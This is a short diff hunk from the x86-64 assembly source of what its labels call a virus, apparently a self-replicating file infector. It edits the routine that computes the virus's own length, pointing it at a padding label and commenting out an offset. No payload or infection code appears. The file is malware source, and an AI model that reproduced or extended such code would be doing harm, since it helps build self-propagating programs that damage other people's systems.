@@ -145,8 +145,8 @@ _read_dir:
 ;; Get the virus total length = (&_final_end + 2) - &_string
 _calculate_virus_size:
 	xor		r10, r10					; clear %r10
-	lea		r10, [rel _final_end]		; %r10 = <addr _final_end>
-	add		r10, 2						; final_end has 2 bytes of instrucitions
+	lea		r10, [rel _padding]			; %r10 = <addr _final_end>
+;	add		r10, 2						; final_end has 2 bytes of instrucitions
 	xor		r11, r11					; clear %r11
 	lea		r11, [rel _string]			; %r11 = <addr _string>
 	sub		r10, r11					; <addr _final_end> -= <addr _string>
